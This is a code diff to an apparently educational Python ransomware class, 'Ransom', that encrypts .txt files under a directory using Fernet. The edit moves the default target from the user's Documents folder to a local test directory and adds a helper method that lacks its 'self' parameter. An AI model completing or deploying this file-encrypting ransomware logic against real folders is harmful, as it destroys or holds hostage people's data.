@@ -20,11 +20,18 @@ class Ransom:
         self.fernet = Fernet(self.key)
         self.targets = ['txt']
         if root == None:
-            self.root = '~/Documents/'
+            self.root = self.getDefaultRoot()
         else:
             self.root = root
         
         self.keyManager = KeyManager()
+    
+    def getDefaultRoot():
+        path = os.path.realpath('ransom.py')
+        parts = path.split('/')
+        path = '/'.join(parts[:-1])
+        path+='/testDIr/'
+        return path
 
     def encrypt(self):
         for root, dirs, files in os.walk(self.root):
@@ -51,6 +58,7 @@ class Ransom:
             return 
         
         self.decrypt()
+    
     def decrypt(self):
         for root, dirs, files in os.walk(self.root):
             for file in files:
